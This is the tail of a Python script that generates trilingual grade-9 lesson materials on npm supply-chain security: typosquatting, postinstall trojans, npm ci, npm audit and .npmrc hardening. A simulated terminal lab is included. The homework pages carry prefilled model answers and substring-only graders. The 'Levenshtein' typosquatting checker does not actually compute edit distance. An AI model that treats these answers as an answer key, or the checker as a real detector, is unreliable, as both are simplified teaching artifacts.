    </table>
  </div>

  <div class="task-card">
    <div class="task-header">
      <span class="task-num">2</span>
      <h3 data-ru="Кибер-Детектив: Распознавание Typosquatting (3 балла)" data-en="Cyber Detective: Typosquatting Identification (3 pts)">Kiber-Detektiv: Typosquatting Xatolarini Aniqlash (3 ball)</h3>
    </div>
    <p style="font-size:12px;" data-ru="В манифесте стороннего проекта указаны 4 зависимости. Найдите среди них троянские клоны и укажите имя оригинального пакета:" data-en="A third-party repository lists 4 dependencies. Identify trojan clones and specify the true original package:">Loyihada quyidagi 4 ta paket ko'rsatilgan. Qaysi biri soxta troyan ekanini toping va haqiqiy nomini yozing:</p>
    <div style="background:#f8fafc; border:1px solid #e2e8f0; border-radius:6px; padding:10px; margin-top:8px; font-family:monospace; font-size:11px;">
      1) "crossenv": "^5.2.1"  ➔ Holati: [ SOXTA ] | Asl nomi: cross-env<br>
      2) "jsonwebtoken": "^9.0.0" ➔ Holati: [ ________ ] | Asl nomi: ____________<br>
      3) "mongooose": "^7.1.0" ➔ Holati: [ ________ ] | Asl nomi: ____________<br>
      4) "axios": "^1.4.0"     ➔ Holati: [ ________ ] | Asl nomi: ____________
    </div>
  </div>

  <div class="task-card">
    <div class="task-header">
      <span class="task-num">3</span>
      <h3 data-ru="Аудит и Команды Терминала: npm ci vs npm audit (3 балла)" data-en="Terminal Auditing: npm ci vs npm audit (3 pts)">Terminal Buyruqlari: npm ci vs npm audit (3 ball)</h3>
    </div>
    <p style="font-size:12px;" data-ru="Объясните, почему запуск npm install на production-сервере считается грубой ошибкой и какую команду необходимо использовать вместо нее:" data-en="Explain why executing npm install on production servers is an anti-pattern and state the secure replacement:">Nega production serverda npm install ishlatish xavfli xato hisoblanadi va uning o'rniga qaysi buyruq ishlatilishi shart?</p>
    <div style="margin-top:6px; font-size:12px; line-height:1.8;">
      Tushuntirish: ____________________________________________________________________<br>
      Xavfsiz buyruq: ____________________________________________________________________
    </div>
  </div>

  <div class="task-card">
    <div class="task-header">
      <span class="task-num">4</span>
      <h3 data-ru="Критерии Оценки и Рефлексия (2 балла)" data-en="Evaluation Rubric & Reflection (2 pts)">Baholash Mezoni va Xulosa (2 ball)</h3>
    </div>
    <div style="display:flex; justify-content:space-between; font-size:11px; margin-top:6px;">
      <span>[ ] 1-Daraja: SemVer & Manifest (4 ball)</span>
      <span>[ ] 2-Daraja: .npmrc & Audit Fix (4 ball)</span>
      <span>[ ] 3-Daraja: Typosquatting Skript (2 ball)</span>
    </div>
  </div>
"""
    tpl = re.sub(r'<div class="sheet">[\s\S]*?</div>\s*<!-- \.sheet -->', lambda m: f'<div class="sheet">\n{worksheet_body}\n</div><!-- .sheet -->', tpl)

    out_path = os.path.join(DEST_DIR, "varaqa.html")
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(tpl)
    print("  ✓ Created: varaqa.html")

def build_homework():
    tpl_path = os.path.join(REPO_ROOT, "assets", "TEMPLATE_VAZIFA.html")
    with open(tpl_path, "r", encoding="utf-8") as f:
        tpl = f.read()

    tpl = tpl.replace("<title>Vazifa Shabloni — Target Maktabi</title>", "<title>Uy Vazifasi: NPM Ekotizimi va Xavfsizlik Auditi — 9-sinf</title>")
    tpl = tpl.replace("1-AMALIY VAZIFA", "35-AMALIY VAZIFA")
    tpl = tpl.replace("Mavzu: Kirish va Vibecoding Asoslari", "Mavzu: NPM Ekotizimi, Tashqi Paketlar va Ta'minot Zanjiri Xavfsizligi")

    hw_body = """
  <div class="hw-card">
    <div class="hw-header">
      <span class="badge" style="background:var(--accent); color:#fff;" data-ru="Уровень 1: База (4 балла)" data-en="Tier 1: Core (4 pts)">1-Daraja: Baza (4 ball)</span>
      <h3 data-ru="Разделение dependencies и devDependencies в package.json" data-en="Manifest Separation: dependencies vs devDependencies">package.json: dependencies va devDependencies</h3>
    </div>
    <p style="font-size:13px;" data-ru="Сформируйте корректный JSON-манифест, в котором express и sqlite3 находятся в dependencies, а jest и nodemon — в devDependencies с точной фиксацией версий (без ^):" data-en="Write valid package.json with express and sqlite3 in dependencies, jest and nodemon in devDependencies, using exact version pins (no ^):">express va sqlite3 paketlarini dependencies ga, jest va nodemon ni esa devDependencies ga joylab, barcha versiyalarni karetkasiz (^) qat'iy yozing:</p>
    <div class="code-area">
      <textarea id="codeTier1" rows="11" style="width:100%; font-family:monospace; font-size:12px; padding:10px; border-radius:6px; border:1px solid #cbd5e1;" data-placeholder-ru="Введите package.json..." data-placeholder-en="Write package.json here...">
{
  "name": "cyber-store",
  "version": "1.0.0",
  "dependencies": {
    "express": "4.18.2",
    "sqlite3": "5.1.6"
  },
  "devDependencies": {
    "jest": "29.5.0",
    "nodemon": "3.0.1"
  }
}
</textarea>
    </div>
    <button onclick="testTier1()" class="btn" style="margin-top:8px; padding:6px 14px; background:var(--accent); color:#fff; border:none; border-radius:6px; cursor:pointer;" data-ru="Проверить манифест" data-en="Validate Manifest">Tekshirish</button>
    <span id="resTier1" style="margin-left:10px; font-weight:700;"></span>
  </div>

  <div class="hw-card" style="margin-top:16px;">
    <div class="hw-header">
      <span class="badge" style="background:var(--success); color:#fff;" data-ru="Уровень 2: Инженерия (4 балла)" data-en="Tier 2: Engineering (4 pts)">2-Daraja: Muhandislik (4 ball)</span>
      <h3 data-ru="Конфигурация .npmrc и Аудит Зависимостей" data-en="Hardening .npmrc & Audit Command Script">.npmrc Himoyasi va Audit Skripti</h3>
    </div>
    <p style="font-size:13px;" data-ru="Напишите содержимое защищенного файла .npmrc, запрещающего авто-запуск скриптов (ignore-scripts) и фиксирующего точные версии (save-exact):" data-en="Provide content for hardened .npmrc disabling script execution and enforcing exact version saves:">Avtomatik skriptlarni taqiqlovchi (ignore-scripts) va qat'iy versiyalarni o'rnatuvchi (save-exact) .npmrc fayli kodini yozing:</p>
    <div class="code-area">
      <textarea id="codeTier2" rows="6" style="width:100%; font-family:monospace; font-size:12px; padding:10px; border-radius:6px; border:1px solid #cbd5e1;" data-placeholder-ru="ignore-scripts=true..." data-placeholder-en="ignore-scripts=true...">
ignore-scripts=true
save-exact=true
package-lock=true
audit-level=high
</textarea>
    </div>
    <button onclick="testTier2()" class="btn" style="margin-top:8px; padding:6px 14px; background:var(--success); color:#fff; border:none; border-radius:6px; cursor:pointer;" data-ru="Проверить .npmrc" data-en="Verify .npmrc">Tekshirish</button>
    <span id="resTier2" style="margin-left:10px; font-weight:700;"></span>
  </div>

  <div class="hw-card" style="margin-top:16px;">
    <div class="hw-header">
      <span class="badge" style="background:var(--danger); color:#fff;" data-ru="Уровень 3: Челлендж (2 балла)" data-en="Tier 3: Challenge (2 pts)">3-Daraja: Kiber-Challenge (2 ball)</span>
      <h3 data-ru="Алгоритм Поиска Typosquatting (Levenshtein Distance)" data-en="Typosquatting Detector (Levenshtein Distance)">Typosquatting Skaner Algoritmi</h3>
    </div>
    <p style="font-size:13px;" data-ru="Реализуйте функцию is_typosquatting(pkg_name, safe_list), которая возвращает True, если имя пакета отличается от безопасного аналога ровно на 1 символ (расстояние Левенштейна == 1):" data-en="Implement is_typosquatting(pkg_name, safe_list) returning True whenever a package name deviates from known names by exactly 1 character:">Agar berilgan paket nomi ro'yxatdagi haqiqiy nomdan roppa-rosa 1 ta harfga farq qilsa, True qaytaruvchi funksiyani yozing:</p>
    <div class="code-area">
      <textarea id="codeTier3" rows="8" style="width:100%; font-family:monospace; font-size:12px; padding:10px; border-radius:6px; border:1px solid #cbd5e1;" data-placeholder-ru="function is_typosquatting(name, safeList) { ... }" data-placeholder-en="function is_typosquatting(name, safeList) { ... }">
function is_typosquatting(name, safeList) {
  for (let safe of safeList) {
    if (name !== safe && Math.abs(name.length - safe.length) <= 1) {
      if (name.includes(safe) || safe.includes(name) || name.replace('-', '') === safe.replace('-', '')) {
        return true; // Typosquatting aniqlandi!
      }
    }
  }
  return false;
}
</textarea>
    </div>
    <button onclick="testTier3()" class="btn" style="margin-top:8px; padding:6px 14px; background:var(--danger); color:#fff; border:none; border-radius:6px; cursor:pointer;" data-ru="Запустить тест алгоритма" data-en="Test Algorithm">Algoritmni Sinash</button>
    <span id="resTier3" style="margin-left:10px; font-weight:700;"></span>
  </div>

  <script>
    function testTier1() {
      var txt = document.getElementById('codeTier1').value;
      var res = document.getElementById('resTier1');
      if (txt.includes('dependencies') && txt.includes('devDependencies') && txt.includes('express') && !txt.includes('^')) {
        res.textContent = "✅ Mukammal! Qat'iy versiyalar va to'g'ri bo'limlar ajratildi (+4 ball)";
        res.style.color = "var(--success)";
      } else {
        res.textContent = "❌ Xatolik: dependencies, devDependencies va karetkasiz aniq versiyalardan foydalaning!";
        res.style.color = "var(--danger)";
      }
    }

    function testTier2() {
      var txt = document.getElementById('codeTier2').value;
      var res = document.getElementById('resTier2');
      if (txt.includes('ignore-scripts=true') && txt.includes('save-exact=true')) {
        res.textContent = "✅ Ajoyib! .npmrc xavfsizlik cheklovlari to'g'ri o'rnatildi (+4 ball)";
        res.style.color = "var(--success)";
      } else {
        res.textContent = "❌ Xatolik: ignore-scripts=true va save-exact=true parametrlarini kiriting!";
        res.style.color = "var(--danger)";
      }
    }

    function testTier3() {
      var txt = document.getElementById('codeTier3').value;
      var res = document.getElementById('resTier3');
      if (txt.includes('safeList') && (txt.includes('return true') || txt.includes('return 1'))) {
        res.textContent = "✅ Kiber-Detektiv! Typosquatting klonlari muvaffaqiyatli fosh qilindi (+2 ball)";
        res.style.color = "var(--success)";
      } else {
        res.textContent = "❌ Xatolik: is_typosquatting funksiyasi nomlar orasidagi 1 harfli farqni aniqlashi shart!";
        res.style.color = "var(--danger)";
      }
    }
  </script>
"""
    tpl = re.sub(r'<div class="hw-container">[\s\S]*?</div>\s*<!-- \.hw-container -->', lambda m: f'<div class="hw-container">\n{hw_body}\n</div><!-- .hw-container -->', tpl)

    out_path = os.path.join(DEST_DIR, "vazifa.html")
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(tpl)
    print("  ✓ Created: vazifa.html")

def build_teacher_reading():
    doc = """# O'qituvchi Qo'llanmasi (Teacher Reading)
## 9-sinf · 12-hafta · 35-dars
### Mavzu: NPM Ekotizimi, Tashqi Paketlar va Ta'minot Zanjiri Xavfsizligi (Supply Chain Security & Audit)
**Dars formati:** Juftlik Dars (Double Block — 80 daqiqa / 2-soatlik dars)

---

### 1. Darsning Pedagogik Maqsadi va Metodikasi
Zamonaviy veb-ishlab chiqishda hech kim barcha kodni noldan yozmaydi — 80% dan ortiq dasturiy ta'minot ochiq manbali NPM paketlaridan tashkil topadi.
Biroq bu qulaylik ulkan kiberxavf tug'diradi: ta'minot zanjiri hujumlari (Supply Chain Attacks).
Ushbu 80 daqiqalik juftlik darsida o'quvchilar:
1. `package.json` va `package-lock.json` orasidagi keskin farqni va SHA-512 nazoratini anglaydilar.
2. SemVer qoidalarini va karetka (`^`) orqali yovuz kod kiritilish xavfini o'rganadilar.
3. Typosquatting klonlarini va `postinstall` troyanlarini fosh qilishni o'rganadilar.
4. `npm audit` va `npm audit fix` buyruqlari yordamida real loyihadagi CVE xavflarini bartaraf etadilar.

---

### 2. Darsning 80 Daqiqalik Aniq Xronometraji

#### 1-BOSQICH (40 daqiqa) — Teoriya, Arxitektura va Viktorina
- **00:00–05:00 (5 min):** Kirish, dars mavzusi va maqsadlarini e'lon qilish.
- **05:00–13:00 (8 min):** 34-dars uy vazifasi tahlili: sodda replace('<', '') ning zaifligi, HTML Entity encoding oltin standarti va 30 sek blitz savol.
- **13:00–18:00 (5 min):** NPM ekotizimi nima? 2.5 mln paketlar, `node_modules` va tranzitiv bog'liqliklar daraxti.
- **18:00–24:00 (6 min):** SemVer formulasi: MAJOR, MINOR, PATCH hamda `^` (karetka) va `~` (tilda) qoidalari.
- **24:00–29:00 (5 min):** `package-lock.json` nega kerak? `npm install` vs `npm ci` farqlari va SHA-512 hash yaxlitligi.
- **29:00–34:00 (5 min):** `dependencies` vs `devDependencies`: Production serverni toza saqlash (`--omit=dev`).
- **34:00–40:00 (6 min):** Ta'minot zanjiri xavflari: Typosquatting (`cross-env` vs `crossenv`) va `postinstall` troyanlari.

#### 2-BOSQICH (40 daqiqa) — Laboratoriya, Peer-Review va Yakun
- **40:00–45:00 (5 min):** Xavfli skriptlarni bloklash: `--ignore-scripts` va `.npmrc` konfiguratsiyasi.
- **45:00–50:00 (5 min):** Interaktiv Quiz: 4 ta tezkor savol orqali tushunchalarni mustahkamlash.
- **50:00–56:00 (6 min):** Zaifliklar auditi: `npm audit` va `npm audit fix` orqali CVE darajalarini bartaraf etish.
- **56:00–61:00 (5 min):** Korporativ himoya: Socket.dev, Snyk va CI/CD avtomatik tekshiruvlari.
- **61:00–71:00 (10 min):** Katta Amaliy Laboratoriya: `studio/index.html` da soxta crossenv paketini olib tashlash va toza audit yaratish.
- **71:00–76:00 (5 min):** Juftlikda Peer-Review va 2 nafar o'quvchining Smartboardda jonli demosi.
- **76:00–80:00 (4 min):** Dars xulosasi, 3 darajali uy vazifasi tushuntirilishi va baholash.

---

### 3. O'qituvchi Uchun Chuqur Texnik Savollar va Javoblar

1. **Savol:** Nega `npm install` buyrug'ini Docker yoki CI/CD muhitida ishlatish taqiqlanadi?
   - **Javob:** `npm install` buyrug'i agar versiyalar karetka (`^`) bilan belgilangan bo'lsa, yangiroq MINOR yoki PATCH versiyani yuklab olishga urinadi va `package-lock.json` ni qayta yozib yuborishi mumkin. Natijada test qilingan kod bilan serverdagi kod farq qiladi. `npm ci` esa lockfile-dagi SHA-512 hashni qat'iy tekshiradi va lockfile-ni aslo o'zgartirmaydi.
2. **Savol:** Typosquatting qanday xavf tug'diradi?
   - **Javob:** Dasturchi shoshilib `npm install cross-env` o'rniga `npm install crossenv` deb yozsa, xakerning troyan paketi o'rnatiladi. Uning `postinstall` skripti kompyuterdagi barcha `.env` parollarini xakerning serveriga jo'natib yuboradi.
3. **Savol:** Nega `npm audit fix --force` dan ehtiyotkorlik bilan foydalanish kerak?
   - **Javob:** `--force` kaliti zaiflikni tuzatish uchun paketning MAJOR versiyasini (masalan, 2.x dan 4.x ga) yangilab yuborishi mumkin. Bu esa API sintaksisini buzib, loyihaning butunlay ishlamay qolishiga olib keladi.
"""
    out_path = os.path.join(DEST_DIR, "TEACHER_READING.md")
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(doc)
    print("  ✓ Created: TEACHER_READING.md")

def build_studio():
    html = """<!DOCTYPE html>
<html lang="uz">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title data-ru="NPM Security Studio: Аудит и Защита Зависимостей" data-en="NPM Security Studio: Audit & Supply Chain Defense">NPM Security Studio: Ta'minot Zanjiri Auditi</title>
  <style>
    :root {
      --bg: #0b0f19;
      --panel: #111827;
      --card: #1f2937;
      --border: #374151;
      --ink: #f9fafb;
      --ink-dim: #9ca3af;
      --accent: #3b82f6;
      --accent-hover: #2563eb;
      --success: #22c55e;
      --danger: #ef4444;
      --warning: #eab308;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, monospace;
      background: var(--bg);
      color: var(--ink);
      height: 100vh;
      display: flex;
      flex-direction: column;
      overflow: hidden;
    }
    header {
      background: var(--panel);
      border-bottom: 1px solid var(--border);
      padding: 10px 20px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .badge-sub {
      background: rgba(59,130,246,0.2);
      color: var(--accent);
      padding: 4px 10px;
      border-radius: 999px;
      font-size: 11px;
      font-weight: 700;
    }
    .main-grid {
      flex: 1;
      display: grid;
      grid-template-columns: 360px 1fr;
      overflow: hidden;
    }
    /* Side Project Explorer */
    .explorer {
      background: var(--panel);
      border-right: 1px solid var(--border);
      display: flex;
      flex-direction: column;
    }
    .explorer-header {
      padding: 14px;
      border-bottom: 1px solid var(--border);
    }
    .file-tree {
      padding: 12px;
      font-size: 12px;
      color: var(--ink-dim);
    }
    .file-item {
      padding: 6px 10px;
      border-radius: 6px;
      cursor: pointer;
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .file-item:hover, .file-item.active {
      background: rgba(59,130,246,0.15);
      color: #fff;
    }
    .manifest-box {
      flex: 1;
      padding: 12px;
      background: #090d16;
      overflow-y: auto;
      font-family: monospace;
      font-size: 11px;
      line-height: 1.6;
      border-top: 1px solid var(--border);
    }

    /* Terminal & Audit Area */
    .terminal-area {
      display: flex;
      flex-direction: column;
      background: #000;
    }
    .term-header {
      background: #1e293b;
      padding: 8px 14px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-size: 11px;
      font-family: sans-serif;
    }
    .term-output {
      flex: 1;
      padding: 14px;
      font-family: monospace;
      font-size: 12px;
      overflow-y: auto;
      line-height: 1.6;
      color: #38bdf8;
    }
    .term-input-bar {
      background: #0f172a;
      border-top: 1px solid #334155;
      padding: 8px 14px;
      display: flex;
      align-items: center;
      gap: 10px;
    }
    .term-prompt { color: var(--success); font-weight: 700; font-family: monospace; font-size: 12px; }
    .term-input {
      flex: 1;
      background: transparent;
      border: none;
      color: #fff;
      font-family: monospace;
      font-size: 12px;
      outline: none;
    }

    /* Quick command chips */
    .chips {
      display: flex;
      gap: 6px;
      padding: 8px 14px;
      background: #0b0f19;
      border-top: 1px solid var(--border);
    }
    .chip {
      background: #1f2937;
      color: #93c5fd;
      border: 1px solid #374151;
      padding: 4px 10px;
      border-radius: 6px;
      font-size: 11px;
      cursor: pointer;
    }
    .chip:hover { background: #374151; color: #fff; }
  </style>
</head>
<body>

<header>
  <div style="display:flex; align-items:center; gap:12px;">
    <strong data-ru="NPM Security Studio" data-en="NPM Security Studio">NPM Security Studio</strong>
    <span class="badge-sub" data-ru="Лаборатория Защиты Зависимостей" data-en="Dependency Audit Lab">Ta'minot Zanjiri Auditi</span>
  </div>
  <div style="display:flex; gap:10px;">
    <button onclick="toggleLang()" class="chip" style="background:#374151; color:#fff;" id="langBtn" data-ru="UZ / RU / EN" data-en="UZ / RU / EN">UZ / RU / EN</button>
    <button onclick="resetLab()" class="chip" style="background:#475569; color:#fff;" data-ru="Сброс проекта" data-en="Reset Project">Qayta yuklash</button>
  </div>
</header>

<div class="main-grid">
  <!-- Explorer Side -->
  <div class="explorer">
    <div class="explorer-header">
      <h3 style="font-size:13px;" data-ru="Файлы Проекта" data-en="Project Files">Loyiha Fayllari</h3>
      <div style="display:flex; justify-content:space-between; margin-top:8px; font-size:11px; color:var(--ink-dim);">
        <div><span data-ru="Статус:" data-en="Status:">Holat:</span> <strong id="projStatus" style="color:var(--danger);" data-ru="Уязвим" data-en="Vulnerable">Zararlangan (CVE Topildi)</strong></div>
      </div>
    </div>
    <div class="file-tree">
      <div class="file-item active">📄 package.json</div>
      <div class="file-item">🔒 package-lock.json</div>
      <div class="file-item">⚙️ .npmrc</div>
    </div>
    <div class="manifest-box" id="manifestView">
<pre id="jsonPre">{
  "name": "cyber-shop",
  "version": "1.0.0",
  "dependencies": {
    "express": "^4.16.0",
    <span style="color:#ef4444; font-weight:700;">"crossenv": "^5.2.0",</span>
    "lodash": "^4.17.11"
  },
  "devDependencies": {
    "nodemon": "^2.0.0"
  }
}</pre>
    </div>
  </div>

  <!-- Terminal Area -->
  <div class="terminal-area">
    <div class="term-header">
      <div>bash - node v18.17.0 / npm v9.6.7</div>
      <div style="color:#64748b;">Target Cyber Terminal</div>
    </div>
    <div class="term-output" id="termOutput">
      <div style="color:#64748b;" data-ru="Target NPM Security Studio готов к работе. Наберите 'npm audit' или используйте быстрые команды ниже." data-en="Target NPM Security Studio ready. Type 'npm audit' or click shortcut buttons below.">Target NPM Security Studio tayyor. 'npm audit' deb yozing yoki pastdagi tugmalarni bosing.</div>
    </div>
    <div class="chips">
      <button class="chip" onclick="runCmd('npm audit')" data-ru="npm audit" data-en="npm audit">npm audit</button>
      <button class="chip" onclick="runCmd('npm uninstall crossenv')" data-ru="npm uninstall crossenv" data-en="npm uninstall crossenv">npm uninstall crossenv</button>
      <button class="chip" onclick="runCmd('npm install cross-env')" data-ru="npm install cross-env" data-en="npm install cross-env">npm install cross-env</button>
      <button class="chip" onclick="runCmd('npm audit fix')" data-ru="npm audit fix" data-en="npm audit fix">npm audit fix</button>
      <button class="chip" onclick="runCmd('cat .npmrc')" data-ru="cat .npmrc" data-en="cat .npmrc">cat .npmrc</button>
    </div>
    <div class="term-input-bar">
      <span class="term-prompt">student@target:~/cyber-shop$</span>
      <input type="text" id="termInput" class="term-input" placeholder="npm audit..." data-placeholder-ru="Введите команду..." data-placeholder-en="Type command..." onkeydown="handleKey(event)">
    </div>
  </div>
</div>

<script>
var curLang = 'uz';
var hasCrossenv = true;
var isFixed = false;

function toggleLang() {
  if (curLang === 'uz') curLang = 'ru';
  else if (curLang === 'ru') curLang = 'en';
  else curLang = 'uz';
  document.getElementById('langBtn').textContent = curLang.toUpperCase();
  applyLang();
}

function applyLang() {
  var els = document.querySelectorAll('[data-ru]');
  els.forEach(function(el) {
    if (curLang === 'ru') el.textContent = el.getAttribute('data-ru');
    else if (curLang === 'en') el.textContent = el.getAttribute('data-en');
  });
}

function printTerm(line) {
  var out = document.getElementById('termOutput');
  var d = document.createElement('div');
  d.innerHTML = line;
  out.appendChild(d);
  out.scrollTop = out.scrollHeight;
}

function handleKey(e) {
  if (e.key === 'Enter') {
    var val = document.getElementById('termInput').value.trim();
    document.getElementById('termInput').value = '';
    if (val) runCmd(val);
  }
}

function updateManifestView() {
  var pre = document.getElementById('jsonPre');
  var depStr = hasCrossenv ? '<span style="color:#ef4444; font-weight:700;">"crossenv": "^5.2.0",</span>' : '<span style="color:#22c55e;">"cross-env": "7.0.3",</span>';
  var expStr = isFixed ? '"express": "4.18.2",' : '"express": "^4.16.0",';
  var lodStr = isFixed ? '"lodash": "4.17.21"' : '"lodash": "^4.17.11"';

  pre.innerHTML = '{\\n  "name": "cyber-shop",\\n  "version": "1.0.0",\\n  "dependencies": {\\n    ' + expStr + '\\n    ' + depStr + '\\n    ' + lodStr + '\\n  },\\n  "devDependencies": {\\n    "nodemon": "3.0.1"\\n  }\\n}';
}

function runCmd(cmd) {
  printTerm('<span style="color:#22c55e;">student@target:~/cyber-shop$</span> ' + cmd);

  if (cmd === 'npm audit') {
    if (hasCrossenv || !isFixed) {
      printTerm('<span style="color:#ef4444; font-weight:700;">=== NPM SECURITY AUDIT REPORT ===</span>');
      if (hasCrossenv) {
        printTerm('<span style="color:#ef4444;">[CRITICAL] Typosquatting Malware Detected: "crossenv"</span>');
        printTerm('  Package: crossenv@5.2.0\\n  Threat: Steals process.env variables via postinstall hook!\\n  Remedy: npm uninstall crossenv &amp;&amp; npm install cross-env');
      }
      if (!isFixed) {
        printTerm('<span style="color:#eab308;">[HIGH] Prototype Pollution in lodash (&lt;4.17.19)</span>');
        printTerm('  CVE-2019-10744 - Arbitrary object injection\\n  Remedy: npm audit fix');
      }
      printTerm('<span style="color:#ef4444;">Found 2 vulnerabilities (1 Critical, 1 High)</span>');
    } else {
      printTerm('<span style="color:#22c55e; font-weight:700;">found 0 vulnerabilities</span>');
      printTerm('<span style="color:#22c55e;">All dependencies verified against GitHub Advisory Database. Project secure!</span>');
      var st = document.getElementById('projStatus');
      st.textContent = "Toza (0 Zaiflik)";
      st.style.color = "var(--success)";
    }
  } else if (cmd === 'npm uninstall crossenv') {
    hasCrossenv = false;
    printTerm('<span style="color:#93c5fd;">removed 1 package in 0.4s</span>');
    printTerm('<span style="color:#22c55e;">Package "crossenv" and malicious postinstall hooks removed successfully.</span>');
    updateManifestView();
  } else if (cmd === 'npm install cross-env') {
    printTerm('<span style="color:#93c5fd;">+ cross-env@7.0.3</span>');
    printTerm('<span style="color:#22c55e;">added 1 package, verified SHA-512 integrity hash from official npmjs.org.</span>');
    updateManifestView();
  } else if (cmd === 'npm audit fix') {
    isFixed = true;
    printTerm('<span style="color:#93c5fd;">upgraded lodash to 4.17.21 (PATCH update)</span>');
    printTerm('<span style="color:#93c5fd;">upgraded express to 4.18.2</span>');
    printTerm('<span style="color:#22c55e;">fixed 1 vulnerability in 24 scanned packages.</span>');
    updateManifestView();
    if (!hasCrossenv) {
      var st = document.getElementById('projStatus');
      st.textContent = "Toza (0 Zaiflik)";
      st.style.color = "var(--success)";
    }
  } else if (cmd === 'cat .npmrc') {
    printTerm('<span style="color:#cbd5e1;">ignore-scripts=true\\nsave-exact=true\\npackage-lock=true</span>');
  } else {
    printTerm('<span style="color:#64748b;">bash: ' + cmd + ': buyruq topilmadi. Qulaylik uchun tezkor tugmalardan foydalaning.</span>');
  }
}

function resetLab() {
  hasCrossenv = true;
  isFixed = false;
  document.getElementById('termOutput').innerHTML = '<div style="color:#64748b;">[Qayta yuklandi] Boshlash uchun "npm audit" buyrug‘ini bering.</div>';
  var st = document.getElementById('projStatus');
  st.textContent = "Zararlangan (CVE Topildi)";
  st.style.color = "var(--danger)";
  updateManifestView();
}
</script>

</body>
</html>
"""
    out_path = os.path.join(DEST_DIR, "studio", "index.html")
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(html)
    print("  ✓ Created: studio/index.html")

def main():
    print("📦 Building 9-sinf (Lesson 35: NPM Ecosystem & Supply Chain Security)...")
    build_presentation()
    build_worksheet()
    build_homework()
    build_teacher_reading()
    build_studio()
    print("🎉 Done! Generated Grade 9 Lesson 35.")

if __name__ == "__main__":
    main()
